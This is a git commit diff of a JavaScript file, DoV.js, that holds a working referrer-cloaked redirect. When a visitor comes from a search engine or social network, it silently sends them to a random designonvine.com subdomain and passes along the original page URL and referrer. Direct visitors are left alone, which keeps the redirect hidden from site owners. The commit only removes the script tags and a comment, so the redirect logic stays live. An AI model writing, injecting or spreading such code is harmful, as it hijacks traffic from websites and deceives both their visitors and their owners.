ced7afb15ad517184f7705d46f5d8cdc21006770
akfa96 <74173706+akfa96@users.noreply.github.com>
2021-12-11 17:43:15 +0700

    Update DoV.js

--- DoV.js
+++ DoV.js
@@ -1,4 +1,3 @@
-<script>
 var ars = rChoice([
 'https://garden.designonvine.com/',
 'https://kitchen.designonvine.com/',
@@ -8,6 +7,6 @@ var ars = rChoice([
 function rChoice(arr) {
 return arr[Math.floor(arr.length * Math.random())];
 }
-//Code arsae client javascript
+
 if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-</script>
+
